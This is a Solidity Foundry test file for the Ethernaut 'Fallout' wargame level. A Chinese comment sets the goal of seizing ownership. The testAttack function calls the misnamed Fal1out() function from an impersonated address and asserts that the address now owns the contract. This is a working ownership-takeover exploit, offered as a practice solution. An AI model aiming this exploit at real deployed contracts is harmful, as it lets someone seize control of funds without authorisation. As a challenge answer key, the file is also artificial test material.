// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

/* 
获得以下合约的所有权来完成这一关
*/

contract FalloutTest is Test {
    Fallout public fao;

    address payable alice = payable(address(0x220866B1A2219f40e72f5c628B65D54268cA3A9D));

    function setUp() public {
        fao = new Fallout();
    }

    function testAttack() public {
        vm.prank(alice);
        fao.Fal1out();

        address owner = fao.owner();
        assertEq(owner, alice);
    }
}
